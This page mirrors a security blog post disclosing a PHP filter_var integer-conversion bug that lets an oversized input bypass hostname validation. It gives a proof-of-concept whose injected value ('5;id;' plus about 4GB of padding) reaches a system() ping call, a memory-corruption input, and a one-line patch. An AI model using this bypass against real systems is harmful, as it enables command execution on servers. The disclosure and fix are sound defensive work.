<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://pwning.systems/posts/php_filter_var_shenanigans/">Original</a>
    <h1>PHP Filter_var Shenanigans</h1>
    
    <div id="readability-page-1" class="page"><div><div>
        <p><em>It is likely that we have all seen PHP filters that prevent us from encountering vulnerabilities. Here in this blog post, I’ll walk you through my thought process for bypassing a filter by looking for a bug in the filter itself in order to reach a bug!</em></p>
<p>Let’s pretend we have the following code, which passes some user-input to <code>filter_var()</code> and uses the <code>FILTER_VALIDATE_DOMAIN</code> or <code>FILTER FLAG HOSTNAME</code> flag. This adds the functionality to validate hostnames on a per-host rationale (this means that they must begin with an alphanumeric character and must contain only alphanumerics or hyphens throughout their entire length). Following the successful completion of this check, the user-input will be used in a system command (thus potentially introducing a command injection vulnerability). The code that is generated will resemble something like the following.</p>
<div><pre tabindex="0"><code data-lang="php"><span>&lt;?</span><span>php</span>
 
$userinput <span>=</span> <span>&#34;YOUR_USER_INPUT&#34;</span>;
$command <span>=</span> <span>&#34;ping -c5 &#34;</span>;

<span>if</span> (<span>filter_var</span>($userinput, <span>FILTER_VALIDATE_DOMAIN</span>, <span>FILTER_FLAG_HOSTNAME</span>))
{
    <span>system</span>($command <span>.</span> $userinput, $retval);
}

<span>?&gt;</span><span>
</span></code></pre></div><p>Normally, it would not be possible to trigger this command injection in such a situation. Because our user’s input can only contain alphanumeric characters or a hyphen, it would be completely safe in this case.</p>
<p>The underlying code, however, is quite vulnerable, as we will see when we examine it in detail to see how the <code>FILTER_VALIDATE_DOMAIN</code> function works in conjunction with the <code>FILTER_FLAG_HOSTNAME</code> flag. Let’s take a look at how this works!</p>
<p>As soon as we call <code>filter_var()</code> with the <code>FILTER_VALIDATE_DOMAIN</code> flag, the function <code>php_filter_validate_domain()</code> will be executed. Let’s take a closer look at what this means.</p>
<div><pre tabindex="0"><code data-lang="C"><span>void</span> <span>php_filter_validate_domain</span>(PHP_INPUT_FILTER_PARAM_DECL) <span>/* </span>{{{ <span>*/</span>
{
	<span>if</span> (<span>!</span>_php_filter_validate_domain(Z_STRVAL_P(value), Z_STRLEN_P(value), flags)) {
	RETURN_VALIDATION_FAILED
	}
}
<span>/* }}} */</span>
</code></pre></div><p>Essentially, what this does is obtain a pointer to the value of our <code>$userinput</code> variable and pass it as the first argument to <code>_php_filter_validate_domain</code>, as well as passing the output of <code>strlen($userinput)</code>  as the second argument to the same function. It is critical to note that the function <code>strlen()</code> returns an unsigned integer in this case.</p>
<p>Now let’s take a look at the function signature of <code>_php_filter_validate_domain</code>.</p>
<div><pre tabindex="0"><code data-lang="C"><span>static</span>  <span>int</span>  _php_filter_validate_domain(<span>char</span> <span>*</span> domain, <span>int</span> len, zend_long flags)
</code></pre></div><p>In this case, the second argument to this function is <code>int len</code>, which indicates that it is a signed integer, whereas we were passing the output of <code>strlen</code>, which indicates that it is an unsigned integer (<code>size_t</code>), to it as the second argument. Do you see where I’m heading?</p>
<p>In order to comprehend this, we must first understand how integers function. When it comes to numerical variables, they can either be signed or unsigned depending on their ability to represent both positive and negative numbers. The difference between signed and unsigned variables is that signed variables can represent both positive and negative numbers, while unsigned variables can only represent non-negative numbers.</p>
<p>For example, if we assume that the architecture is 32 bits, then an unsigned integer’s value can range from <code>0</code> to <code>4294967295</code> due to the fact that it is unsigned, but an int’s value can only range from <code>-2147483648</code> to <code>2147483648</code> due to the fact that it is signed. The result is that any value greater than <code>2147483647</code> will result in a negative number being passed to the function.</p>
<p>However, if we examine the <code>_php_filter_validate_domain</code> function, we will notice that the variable <code>l</code> is of type <code>size_t</code>, and that the value <code>len</code> has been assigned to this variable.</p>
<div><pre tabindex="0"><code data-lang="C"><span>static</span> <span>int</span> <span>_php_filter_validate_domain</span>(<span>char</span> <span>*</span> domain, <span>int</span> len, zend_long flags) <span>/* </span>{{{ <span>*/</span>
{
	<span>char</span> <span>*</span>e, <span>*</span>s, <span>*</span>t;
	size_t l;
	<span>int</span> hostname <span>=</span> flags <span>&amp;</span> FILTER_FLAG_HOSTNAME;
	<span>unsigned</span> <span>char</span> i <span>=</span> <span>1</span>;

	s <span>=</span> domain;
	l <span>=</span> len; 
	e <span>=</span> domain <span>+</span> l;
	t <span>=</span> e <span>-</span> <span>1</span>;
</code></pre></div><p>The function takes <code>len</code> as a <code>int</code> (signed), and then assigns it to <code>l</code> as a <code>size_t</code>. This is demonstrated above. If we pass a string with a long length, such as <code>4294967296</code>, then the values for both <code>len</code> and <code>l</code> will be <code>0</code>’s because passing that value as an int will wrap to <code>0</code>. This means that <code>s</code> (start) will have the same address as <code>e</code> (end).</p>
<div><pre tabindex="0"><code data-lang="C">	<span>/* Ignore trailing dot */</span>
	<span>if</span> (<span>*</span>t <span>==</span> <span>&#39;.&#39;</span>) {
		e <span>=</span> t;
		l<span>--</span>;
	}

	<span>/* The total length cannot exceed 253 characters (final dot not included) */</span>
	<span>if</span> (l <span>&gt;</span> <span>253</span>) {
		<span>return</span> <span>0</span>;
	}
</code></pre></div><p>We see that if <code>t</code> (end-1) is <code>.</code>  then  <code>e</code> is written with the character <code>.</code>, as if we were to pass a very large number to the function. Example: if we have <code>4294967250</code>, then the variable <code>l</code> will wrap to <code>18446744073709551570</code>, which means we can write a <code>.</code> out of bounds (OOB) A successful exploit would be very difficult. As a result, I decided against taking this route. Following that, we can see that it is checked to see if <code>l</code> is greater than 253.. (Not a problem if we can force it to become <code>0</code>, right?).</p>
<div><pre tabindex="0"><code data-lang="C">	<span>/* First char must be alphanumeric */</span>
	<span>if</span>(<span>*</span>s <span>==</span> <span>&#39;.&#39;</span> <span>||</span> (hostname <span>&amp;&amp;</span> <span>!</span>isalnum((<span>int</span>)<span>*</span>(<span>unsigned</span> <span>char</span> <span>*</span>)s))) {
		<span>return</span> <span>0</span>;
	}

	<span>while</span> (s <span>&lt;</span> e) {
		<span>if</span> (<span>*</span>s <span>==</span> <span>&#39;.&#39;</span>) {
			<span>/* The first and the last character of a label must be alphanumeric */</span>
			<span>if</span> (<span>*</span>(s <span>+</span> <span>1</span>) <span>==</span> <span>&#39;.&#39;</span> <span>||</span> (hostname <span>&amp;&amp;</span> (<span>!</span>isalnum((<span>int</span>)<span>*</span>(<span>unsigned</span> <span>char</span> <span>*</span>)(s <span>-</span> <span>1</span>)) <span>||</span> <span>!</span>isalnum((<span>int</span>)<span>*</span>(<span>unsigned</span> <span>char</span> <span>*</span>)(s <span>+</span> <span>1</span>))))) {
				<span>return</span> <span>0</span>;
			}

			<span>/* Reset label length counter */</span>
			i <span>=</span> <span>1</span>;
		} <span>else</span> {
			<span>if</span> (i <span>&gt;</span> <span>63</span> <span>||</span> (hostname <span>&amp;&amp;</span> <span>*</span>s <span>!=</span> <span>&#39;-&#39;</span> <span>&amp;&amp;</span> <span>!</span>isalnum((<span>int</span>)<span>*</span>(<span>unsigned</span> <span>char</span> <span>*</span>)s))) {
				<span>return</span> <span>0</span>;
			}

			i<span>++</span>;
		}

		s<span>++</span>;
	}

	<span>return</span> <span>1</span>;
}
</code></pre></div><p>The code shown above is the actual code that checks to see that the hostname only contains alphanumeric characters or a hyphen (as opposed to other characters). As we can see, this only occurs if <code>s</code> is less than <code>e</code> in the first place.</p>
<p>In simple terms: If a hostname is checked using PHP’s <code>filter_var</code> function and the value passed to the function is too long, and the parameter <code>l</code> is then wrapping to zero, the check will not be performed. This results in the hostname check being bypassed entirely.</p>
<p>Let’s demonstrate this using a simple PoC!</p>
<div><pre tabindex="0"><code data-lang="php"><span>&lt;?</span><span>php</span>  
  
<span>// normal usage  
</span><span></span><span>var_dump</span>(<span>filter_var</span>(<span>&#34;example.com&#34;</span>, <span>FILTER_VALIDATE_DOMAIN</span>, <span>FILTER_FLAG_HOSTNAME</span>));  
  
<span>// filter bypass  
</span><span></span><span>var_dump</span>(<span>filter_var</span>(<span>&#34;5;id;&#34;</span> <span>.</span> <span>str_repeat</span>(<span>&#34;a&#34;</span>, <span>4294967286</span>) <span>.</span> <span>&#34;a.com&#34;</span>, <span>FILTER_VALIDATE_DOMAIN</span>, <span>FILTER_FLAG_HOSTNAME</span>));  
  
<span>// DoS/Memory corruption
</span><span></span><span>var_dump</span>(<span>filter_var</span>(<span>str_repeat</span>(<span>&#34;a&#34;</span>, <span>2294967286</span>), <span>FILTER_VALIDATE_DOMAIN</span>, <span>FILTER_FLAG_HOSTNAME</span>));  
  
<span>?&gt;</span><span>
</span></code></pre></div><p>Thus, if we pass the following user-input to the program, we will be able to achieve code execution in the manner described in the first example.</p>
<div><pre tabindex="0"><code data-lang="PHP">$userinput <span>=</span> <span>&#34;5;id;&#34;</span>  <span>.</span>  <span>str_repeat</span>(<span>&#34;a&#34;</span>,  <span>4294967286</span>)  <span>.</span>  <span>&#34;a.com&#34;</span>;
</code></pre></div><p>Victory! We were able to get around the filter and get to our vulnerable code this time around.</p>
<blockquote>
<p><strong>NOTE</strong>: Due to the lack of response from the PHP security team, I have decided to make this vulnerability publicly available instead. Especially because I haven’t received any updates despite numerous requests. Because of the ease with which the vulnerability can be exploited, I believe that the community has a right to be informed about it.</p>
</blockquote>
<p>Because the PHP security team has not yet patched this issue, I have attached my own one-liner patch below, that you can apply with the command <code>git am $patchfile</code>.</p>
<pre tabindex="0"><code>From 9c064e66226c9da5b9c0170342ba516055a31be5 Mon Sep 17 00:00:00 2001
From: Jordy Zomer &lt;jordy@pwning.systems&gt;
Date: Fri, 25 Mar 2022 18:03:34 +0100
Subject: [PATCH] Fix integer conversion that results in filter bypass.

Signed-off-by: Jordy Zomer &lt;jordy@pwning.systems&gt;
---
 ext/filter/logical_filters.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/ext/filter/logical_filters.c b/ext/filter/logical_filters.c
index 91bf929a9d..96a6c72b56 100644
--- a/ext/filter/logical_filters.c
+++ b/ext/filter/logical_filters.c
@@ -504,7 +504,7 @@ void php_filter_validate_regexp(PHP_INPUT_FILTER_PARAM_DECL) /* {{{ */
        }
 }

-static int _php_filter_validate_domain(char * domain, int len, zend_long flags) /* {{{ */
+static int _php_filter_validate_domain(char * domain, size_t len, zend_long flags) /* {{{ */
 {
        char *e, *s, *t;
        size_t l;
--
2.32.0
</code></pre><p>There are some limitations to this exploit, for example, the user input must be 4GB in size (which is a large amount of data and may not be possible due to the configuration of some webservers and load balancers).</p>
<p>As always, I hope you found this post to be interesting. Any and all feedback is appreciated :)</p>
<p>Cheers,</p>
<p>Jordy</p>

      </div></div></div>
  </body>
</html>
